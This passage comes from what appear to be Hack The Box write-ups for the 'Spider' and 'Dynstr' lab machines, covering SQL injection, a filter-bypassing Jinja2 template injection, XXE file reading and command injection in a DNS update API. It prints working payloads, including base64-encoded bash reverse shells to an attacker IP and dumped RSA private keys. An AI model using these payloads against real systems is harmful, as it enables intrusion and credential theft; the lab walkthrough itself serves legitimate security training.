--cookie=\u0026#34;session=*\u0026#34; --random-agent --dump ... +----+--------------------------------------+------------+-----------------+ | id | uuid | name | password | +----+--------------------------------------+------------+-----------------+ | 1 | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv | ch1VW4sHERE7331 | +----+--------------------------------------+------------+-----------------+ It is important for sqlmap to work that you say \u0026ldquo;No\u0026rdquo; when it asks for:\n you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] do you want to URL encode cookie values (implementation specific)? [Y/n]  Exploiting a tricky SSTI And now we have the password for user chiv (this is another reference to the SSTI blogpost), we can enter the administration panel at http://spider.htb/admin:\nAs chiv, we have access to a tickets dashboard at http://spider.htb/view?check=support and we can add new tickets from http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal. This URL is found inside a message:\nWe could try again to inject SSTI payloads, but the server has a WAF blocking some characters. Among the bad characters and expressions, we have: {{, }}, _, ., ', if, for, filter and block.\nThere are multiple bypasses in the SSTI blogpost, but none of them is completely adequate.\nWe are forced to use {% code %} format in order to enter a valid template block. But with that format, we need to enter another expression. These template blocks are used mainly with if and for statements in Python. But these keywords are blocked.\nFrom the blogpost we obtain this payload, which is useful because matches some of our current conditions:\n If the waf blocks “.” and “_”:\n {{request[\u0026#39;application\u0026#39;][\u0026#39;\\x5f\\x5fglobals\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;](\u0026#39;os\u0026#39;)[\u0026#39;popen\u0026#39;](\u0026#39;id\u0026#39;)[\u0026#39;read\u0026#39;]()}} And there is another one that bypasses the blocking of {{ and }}:\n{% if request[\u0026#39;application\u0026#39;][\u0026#39;__globals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;)[\u0026#39;popen\u0026#39;](\u0026#39;whoami\u0026#39;)[\u0026#39;read\u0026#39;]() == \u0026#39;chiv\\n\u0026#39; %} a {% endif %} Lastly, there is a Python keyword called with (which is not blocked) that is used mainly to open files (so that they are closed automatically at the end of the code block). However, it can also be used to open processes. Here, the idea is to execute the following Python code (but in Jinja2 format):\nwith os.popen(\u0026#34;\u0026lt;reverse shell command\u0026gt;\u0026#34;).read() as a:  pass We can craft a command to trigger a reverse shell and encode it in Base64 to prevent blocking characters:\n$ echo -n \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.17.44/4444 0\u0026gt;\u0026amp;1\u0026#39; | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx So this is the final payload to exploit the SSTI:\n{% with a = request[\u0026#34;application\u0026#34;][\u0026#34;\\x5f\\x5fglobals\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5fimport\\x5f\\x5f\u0026#34;](\u0026#34;os\u0026#34;)[\u0026#34;popen\u0026#34;](\u0026#34;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNzEvNDQ0NCAwPiYx | base64 -d | bash\u0026#34;)[\u0026#34;read\u0026#34;]() %} a {% endwith %} Foothold on the machine And we get access to the machine as user chiv using a nc listener:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.243. Ncat: Connection from 10.10.10.243:46884. bash: cannot set terminal process group (1622): Inappropriate ioctl for device bash: no job control in this shell chiv@spider:~$ cat user.txt 1682e37de0725754ecdfb8c816c4f80b We have now reached the user.txt flag.\nWe can obtain a better shell via SSH because we have access to the user\u0026rsquo;s id_rsa file:\nchiv@spider:~$ cat .ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS U7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9 MI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7 BLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2 VTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu 6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs hx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl Z5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc XVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq 54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy f0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62 nKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL j0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO JjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW K1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv hm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ mQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8 gu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb 0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2 nfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W CeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG rbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6 IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw== -----END RSA PRIVATE KEY----- System enumeration Now as chiv we can perform a simple port scannning and we see that port 8080 is internally open:\n$ ssh -i id_rsa chiv@10.10.10.243 chiv@spider:~$ for port in $(seq 1 65535); do timeout 1 echo 2\u0026gt;/dev/null \u0026gt; /dev/tcp/127.0.0.1/$port \u0026amp;\u0026amp; echo \u0026#34;Port $port OPEN\u0026#34;; done Port 22 OPEN Port 80 OPEN Port 3306 OPEN Port 8080 OPEN We can use SSH port forwarding to make port 8080 accessible from port 8888 on our attacker machine (we did not chose because Burp Suite listens on that port).\n$ ssh -i id_rsa chiv@10.10.10.243 -L 8888:127.0.0.1:8080 Finding XXE If we enter now to http://localhost:8888 we will see the following login form:\nThis one is another Flask website (same reason as before). This time, the session cookie contains the following data:\n$ python3 -m flask-unsign --decode --cookie \u0026#39;.eJxtjjFvgzAYRP9K5bmDSZMFqQsyhprGyB-2Cd6gjgTBdlHKQIjy3xuGbh1P757u7sgt3qH4jl46FCOVcmrTRYqRaajnoH1Un-vjrcvN0Cq6l9mUWBURcYKjJvCp0r6w_mNV1UyePFSKJyWdcrgkZuNbNtgRUVsmcLo3tC-7jM-87gcdqau80MK68WaJFmIdl2Zlzz02Q4D2P7_RfWmcO6kAvV7FVSp4s5420hujI4Yb_YULzKe_viSsajPIYfsX7K7Z4YP1kHKC39HjFU3fQ5h_UIwfv0J0Vqg.YQRD8w.gRIxNZ4auzfGHswxcJjPUpOabEM\u0026#39; {\u0026#39;lxml\u0026#39;: b\u0026#39;PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+N1JvY2t5PC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4=\u0026#39;, \u0026#39;points\u0026#39;: 0} $ echo PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+N1JvY2t5PC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4= | base64 -d \u0026lt;!-- API Version 1.0.0 --\u0026gt; \u0026lt;root\u0026gt;  \u0026lt;data\u0026gt;  \u0026lt;username\u0026gt;7Rocky\u0026lt;/username\u0026gt;  \u0026lt;is_admin\u0026gt;0\u0026lt;/is_admin\u0026gt;  \u0026lt;/data\u0026gt; \u0026lt;/root\u0026gt; We see that it contains an XML document Base64 encoded that includes the username we entered to login. The attack vector seems clear to be some kind of XML External Entity injection (XXE).\nIt seems that we only have control over the username. This is a problem if we want to perform an XXE attack, because XML entities must be defined above the document data, not inside. There are payloads that use XPATH injection, but they do not work this time.\nUsing Burp Suite, we can discover how the request is being done:\nAs shown in the screenshot, there is another parameter called version, with 1.0.0 as the default value. We can use curl to check if we have control over that parameter:\n$ curl http://localhost:8888/login -svd \u0026#39;username=7Rocky\u0026amp;version=1.33.7\u0026#39; * Trying 127.0.0.1:8888... * Connected to localhost (127.0.0.1) port 8888 (#0) \u0026gt; POST /login HTTP/1.1 \u0026gt; Host: localhost:8888 \u0026gt; User-Agent: curl/7.79.1 \u0026gt; Accept: */* \u0026gt; Content-Type: application/x-www-form-urlencoded \u0026gt; Content-Length: 30 \u0026gt; * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 302 FOUND \u0026lt; Content-Type: text/html; charset=utf-8 \u0026lt; Content-Length: 217 \u0026lt; Location: http://localhost:8888/site \u0026lt; Vary: Cookie \u0026lt; Set-Cookie: session=.eJxtzstqhDAAheFXKVl3YYIDHaGLhvE6GInmgtmNRKoY03QiVB3m3eumu67P-eF7ALPOBkQP8NKBCPCYJDpeGZ0KUcvFihnKXpZbl6nxxpOQpY700_rdIl3y_eNOkQt7mW8Vw1Shs204wQrijM_DVAf82A1WgblQqQsaJJbHg-yNaxsrlNgTz1M3cZRvzBZGZBqpZKi6lCxEDqOA__Xa9-Zzq-dlFGiFR4-r-Ofwubac1L012muBbYf-_uXpBk17eA7fW8gu5KrnfOeNfwfPV-C-Rrt4EAXPX_HQWOc.YXPYog.GJtBaEqASFJ3QxKY08rhwi3v5NQ; HttpOnly; Path=/ \u0026lt; \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; * Connection #0 to host localhost left intact \u0026lt;p\u0026gt;You should be redirected automatically to target URL: \u0026lt;a href=\u0026#34;/site\u0026#34;\u0026gt;/site\u0026lt;/a\u0026gt;. If not click the link. $ python3 -m flask_unsign --decode --cookie \u0026#39;.eJxtzstqhDAAheFXKVl3YYIDHaGLhvE6GInmgtmNRKoY03QiVB3m3eumu67P-eF7ALPOBkQP8NKBCPCYJDpeGZ0KUcvFihnKXpZbl6nxxpOQpY700_rdIl3y_eNOkQt7mW8Vw1Shs204wQrijM_DVAf82A1WgblQqQsaJJbHg-yNaxsrlNgTz1M3cZRvzBZGZBqpZKi6lCxEDqOA__Xa9-Zzq-dlFGiFR4-r-Ofwubac1L012muBbYf-_uXpBk17eA7fW8gu5KrnfOeNfwfPV-C-Rrt4EAXPX_HQWOc.YXPYog.GJtBaEqASFJ3QxKY08rhwi3v5NQ\u0026#39; {\u0026#39;lxml\u0026#39;: b\u0026#39;PCEtLSBBUEkgVmVyc2lvbiAxLjMzLjcgLS0+Cjxyb290PgogICAgPGRhdGE+CiAgICAgICAgPHVzZXJuYW1lPjdSb2NreTwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+\u0026#39;, \u0026#39;points\u0026#39;: 0} $ echo PCEtLSBBUEkgVmVyc2lvbiAxLjMzLjcgLS0+Cjxyb290PgogICAgPGRhdGE+CiAgICAgICAgPHVzZXJuYW1lPjdSb2NreTwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+ | base64 -d \u0026lt;!-- API Version 1.33.7 --\u0026gt; \u0026lt;root\u0026gt;  \u0026lt;data\u0026gt;  \u0026lt;username\u0026gt;7Rocky\u0026lt;/username\u0026gt;  \u0026lt;is_admin\u0026gt;0\u0026lt;/is_admin\u0026gt;  \u0026lt;/data\u0026gt; \u0026lt;/root\u0026gt; So we discover that we have control over the version parameter. This time, we can use it to perform an XXE attack, because we can escape from the comment tag (\u0026lt;!-- ... --\u0026gt;) and inject an XML external entity at the top level.\nWe can take a look at PayloadsAllTheThings to see some payloads.\nTo exploit XXE, we can write a Bash script called xxe.sh to automate the process and extract the desired data (detailed explanation here). The idea is to load files from the server.\nAfter some tests, we discover that we have root privileges.\nAccess as root We can just read the SSH private key for root:\n$ bash xxe.sh /root/.ssh/id_rsa | tee root_id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAl/dn2XpJQuIw49CVNdAgdeO5WZ47tZDYZ+7tXD8Q5tfqmyxq gsgQskHffuzjq8v/q4aBfm6lQSn47G8foq0gQ1DvuZkWFAATvTjliXuE7gLcItPt iFtbg7RQV/xaTwAmdRfRLb7x63TG6mZDRkvFvGfihWqAnkuJNqoVJclgIXLuwUvk 4d3/Vo/MdEUb02ha7Rw9oHSYKR4pIgv4mDwxGGL+fwo6hFNCZ+YK96wMlJc3vo5Z EgkdKXy3RnLKvtxjpIlfmAZGu0T+RX1GlmoPDqoDWRbWU+wdbES35vqxH0uM5WUh vPt5ZDGiKID4Tft57udHxPiSD6YBhLT5ooHfFQIDAQABAoIBAFxB9Acg6Vc0kO/N krhfyUUo4j7ZBHDfJbI7aFinZPBwRtq75VHOeexud2vMDxAeQfJ1Lyp9q8/a1mdb sz4EkuCrQ05O9QthXJp0700+8t24WMLAHKW6qN1VW61+46iwc6iEtBZspNwIQjbN rKwBlmMiQnAyzzDKtNu9+Ca/kZ/cAjLpz3m1NW7X//rcDL8kBGs8RfuHqz/R4R7e HtCvxuXOFnyo/I+A3j1dPHoc5UH56g1W82NwTCbtCfMfeUsUOByLcg3yEypClO/M s7pWQ1e4m27/NmU7R/cslc03YFQxow+CIbdd59dBKTZKErdiMd49WiZSxizL7Rdt WBTACsUCgYEAyU9azupb71YnGQVLpdTOzoTD6ReZlbDGeqz4BD5xzbkDj7MOT5Dy R335NRBf7EJC0ODXNVSY+4vEXqMTx9eTxpMtsP6u0WvIYwy9C7K/wCz+WXNV0zc0 kcSQH/Yfkd2jADkMxHXkz9THXCChOfEt7IUmNSM2VBKb1xBMkuLXQbMCgYEAwUBS FhRNrIB3os7qYayE+XrGVdx/KXcKva6zn20YktWYlH2HLfXcFQQdr30cPxxBSriS BAKYcdFXSUQDPJ1/qE21OvDLmJFu4Xs7ZdGG8o5v8JmF6TLTwi0Vi45g38DJagEl w42zV3vV7bsAhQsMvd3igLEoDFt34jO9nQv9KBcCgYEAk8eLVAY7AxFtljKK++ui /Xv9DWnjtz2UFo5Pa14j0O+Wq7C4OrSfBth1Tvz8TcW+ovPLSD0YKODLgOWaKcQZ mVaF3j64OsgyzHOXe7T2iq788NF4GZuXHcL8Qlo9hqj7dbhrpPUeyWrcBsd1U8G3 AsAj8jItOb6HZHN0owefGX0CgYAICQmgu2VjZ9ARp/Lc7tR0nyNCDLII4ldC/dGg LmQYLuNyQSnuwktNYGdvlY8oHJ+mYLhJjGYUTXUIqdhMm+vj7p87fSmqBVoL7BjT Kfwnd761zVxhDuj5KPC9ZcUnaJe3XabZU7oCSDbj9KOX5Ja6ClDRswwMP31jnW0j 64yyLwKBgBkRFxxuGkB9IMmcN19zMWA6akE0/jD6c/51IRx9lyeOmWFPqitNenWK teYjUjFTLgoi8MSTPAVufpdQV4128HuMbMLVpHYOVWKH/noFetpTE2uFStsNrMD8 vEgG/fMJ9XmHVsPePviZBfrnszhP77sgCXX8Grhx9GlVMUdxeo+j -----END RSA PRIVATE KEY----- $ chmod 600 root_id_rsa And finally we have access to the machine as root and capture the root.txt flag:\n$ ssh -i root_id_rsa root@10.10.10.243 root@spider:~# cat root.txt a50aa50be1beeb8c3d54bc200e40adbe ","image":"/images/HTB/Spider/Spider.png","permalink":"https://7rocky.github.io/en/htb/spider/","section":"htb","summary":"Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Server-Side Template Injection (SSTI) in two fields and SQL injection (SQLi), and an internal website that is vulnerable to XML External Entity (XXE) injection. Advanced knowledge on SSTI and bypassing techniques, SQLi, XXE and port forwarding skills are needed to compromise the machine. This write-up uses a Python script to exploit SSTI and a Bash script to read file using XXE","time":9,"title":"Spider"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.10.244   Release: 05 / 06 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.244 -p 22,53,80 Nmap scan report for 10.10.10.244 Host is up (0.048s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA) | 256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA) |_ 256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519) 53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.16.1-Ubuntu 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Dyna DNS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 15.92 seconds  This machine has ports 22 (SSH), 53 (DNS) and 80 (HTTP) open.\nBackground information Dyna DNS is a company that offers dynamic DNS for their clients. As their services are still in beta, they said to use dynadns:sndanyd for Basic HTTP Authentication when using their API.\nThey also say in their webpage that the API is built so that the requests are similar to the REST API of no-ip.com.\nAt the moment, they have the following domains:\n dnsalias.htb dynamicdns.htb no-ip.htb  DNS exploration Using dig can be useful to see some information about the provided domains:\n$ dig dnsalias.htb dynamicdns.htb no-ip.htb @10.10.10.244 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.10.6 \u0026lt;\u0026lt;\u0026gt;\u0026gt; dnsalias.htb dynamicdns.htb no-ip.htb @10.10.10.244 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NXDOMAIN, id: 53374 ;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 512 ;; QUESTION SECTION: ;dnsalias.htb. IN A ;; AUTHORITY SECTION: . 600 IN SOA a.root-servers.net. nstld.verisign-grs.com. 2022071700 1800 900 604800 86400 ;; Query time: 34 msec ;; SERVER: 80.58.61.250#53(80.58.61.250) ;; WHEN: Sun Jul 17 16:43:18 CEST 2022 ;; MSG SIZE rcvd: 116 ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NXDOMAIN, id: 51687 ;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 512 ;; QUESTION SECTION: ;dynamicdns.htb. IN A ;; AUTHORITY SECTION: . 600 IN SOA a.root-servers.net. nstld.verisign-grs.com. 2022071700 1800 900 604800 86400 ;; Query time: 45 msec ;; SERVER: 80.58.61.250#53(80.58.61.250) ;; WHEN: Sun Jul 17 16:43:18 CEST 2022 ;; MSG SIZE rcvd: 118 ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 26451 ;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;no-ip.htb. IN A ;; AUTHORITY SECTION: no-ip.htb. 60 IN SOA dns1.dyna.htb. hostmaster.dyna.htb. 2021030303 21600 3600 604800 60 ;; Query time: 38 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) ;; WHEN: Sun Jul 17 16:43:18 CEST 2022 ;; MSG SIZE rcvd: 98  Taking a look at the API documentation of no-ip.com, it can be easy to generate valid subdomains (using Basic HTTP Authentication):\n$ curl 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=asdf.no-ip.htb\u0026myip=10.10.17.44' good 10.10.17.44  Now, subdomain asdf.no-ip.htb should be mapped to 10.10.17.44:\n$ dig asdf.no-ip.htb @10.10.10.244 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.10.6 \u0026lt;\u0026lt;\u0026gt;\u0026gt; asdf.no-ip.htb @10.10.10.244 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 26185 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;asdf.no-ip.htb. IN A ;; ANSWER SECTION: asdf.no-ip.htb. 30 IN A 10.10.17.44 ;; Query time: 43 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) ;; WHEN: Sun Jul 17 16:44:16 CEST 2022 ;; MSG SIZE rcvd: 59  Foothold on the machine The tricky thing is that we have a user input in the name of the subdomain (asdf in the above example). So let\u0026rsquo;s try and inject some system commands. As it is blind execution, let\u0026rsquo;s see if we can connect to our machine:\n$ echo 'curl 10.10.17.44' | base64 Y3VybCAxMC4xMC4xNy40NAo= $ curl 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=`echo+Y3VybCAxMC4xMC4xNy40NAo=|base64+-d|bash`.no-ip.htb\u0026myip=10.10.17.44'  Note the use of Base64 as the dot characters get confused with subdomains.\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.10.244 - - [] \"GET / HTTP/1.1\" 200 - ::ffff:10.10.10.244 - - [] \"GET / HTTP/1.1\" 200 -  So, as there is connection, we have got Remote Code Execution (RCE) and thus we can get a reverse shell:\n$ echo 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ curl 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=`echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx|base64+-d|bash`.no-ip.htb\u0026myip=10.10.17.44'  And there is the access as www-data:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.244. Ncat: Connection from 10.10.10.244:43290. bash: cannot set terminal process group (794): Inappropriate ioctl for device bash: no job control in this shell www-data@dynstr:/var/www/html/nic$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@dynstr:/var/www/html/nic$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@dynstr:/var/www/html/nic$ export TERM=xterm www-data@dynstr:/var/www/html/nic$ export SHELL=bash www-data@dynstr:/var/www/html/nic$ stty rows 50 columns 158  Additionally, we can check how the source code was created to allow this RCE:\nwww-data@dynstr:/var/www/html/nic$ ls -l total 4 -rw-r--r-- 1 root root 0 Mar 12 19:41 index.html -rw-r--r-- 1 root root 1110 Mar 13 19:40 update www-data@dynstr:/var/www/html/nic$ cat update  \u0026lt;?php // Check authentication if(!isset($_SERVER['PHP_AUTH_USER']) ||!isset($_SERVER['PHP_AUTH_PW'])) { echo\"badauth\\n\"; exit; } if($_SERVER['PHP_AUTH_USER'].\":\".$_SERVER['PHP_AUTH_PW']!=='dynadns:sndanyd') { echo\"badauth\\n\"; exit; } // Set $myip from GET, defaulting to REMOTE_ADDR $myip =$_SERVER['REMOTE_ADDR']; if($valid=filter_var($_GET['myip'],FILTER_VALIDATE_IP)) { $myip =$valid; } if(isset($_GET['hostname'])) { // Check for a valid domain list($h,$d) =explode(\".\",$_GET['hostname'],2); $validds =array('dnsalias.htb','dynamicdns.htb','no-ip.htb'); if(!in_array($d,$validds)) { echo\"911 [wrngdom: $d]\\n\"; exit; } // Update DNS entry $cmd =sprintf(\"server 127.0.0.1\\nzone %s\\nupdate delete %s.%s\\nupdate add %s.%s 30 IN A %s\\nsend\\n\",$d,$h,$d,$h,$d,$myip);  system('echo \"'.$cmd.'\" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval); // Return good or 911 if(!$retval) { echo\"good $myip\\n\"; } else{ echo\"911 [nsupdate failed]\\n\"; exit; } } else{ echo\"nochg $myip\\n\"; } ?\u0026gt;  They are letting user input (variables $cmd, $h) inside a system() command with no validation, so the commands injected get executed.\nSystem enumeration There are three relevant users to consider:\nwww-data@dynstr:/var/www/html/nic$ grep sh$ /etc/passwd root:x:0:0:root:/root:/bin/bash dyna:x:1000:1000:dyna,,,:/home/dyna:/bin/bash bindmgr:x:1001:1001::/home/bindmgr:/bin/bash  We can list the contents of bindmgr\u0026rsquo;s home directory:\nwww-data@dynstr:/tmp$ ls -la /home/bindmgr/ total 36 drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 . drwxr-xr-x 4 root root 4096 Mar 15 20:26 .. lrwxrwxrwx 1 bindmgr bindmgr 9 Mar 15 20:29 .bash_history - /dev/null -rw-r--r-- 1 bindmgr bindmgr 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25 2020 .bashrc drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache -rw-r--r-- 1 bindmgr bindmgr 807 Feb 25 2020 .profile drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521 -r-------- 1 bindmgr bindmgr 33 Jun 19 01:58 user.txt www-data@dynstr:/tmp$ ls -la /home/bindmgr/.ssh/ total 24 drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 . drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .. -rw-r--r-- 1 bindmgr bindmgr 419 Mar 13 12:00 authorized_keys -rw------- 1 bindmgr bindmgr 1823 Mar 13 11:48 id_rsa -rw-r--r-- 1 bindmgr bindmgr 395 Mar 13 11:48 id_rsa.pub -rw-r--r-- 1 bindmgr bindmgr 444 Mar 13 12:09 known_hosts www-data@dynstr:/tmp$ cat /home/bindmgr/.ssh/authorized_keys from=\"*.infra.dyna.htb\" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen  The user bindmgr has an authorized_keys file. However, to connect via SSH without password, we need to have a private key and an IP address mapped to a subdomain of infra.dyna.htb.\nUsing linpeas.sh to enumerate, it tells that there is a potential private key at ~/support-case-C62796521/C62796521-debugging.script.\nTo attach a subdomain to our IP address, we could try using the previously used API, but domain dyna.htb is not offered:\n$ curl 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=asdf.infra.dyna.htb\u0026myip=10.10.17.44' 911 [wrngdom: infra.dyna.htb]  We find that there is 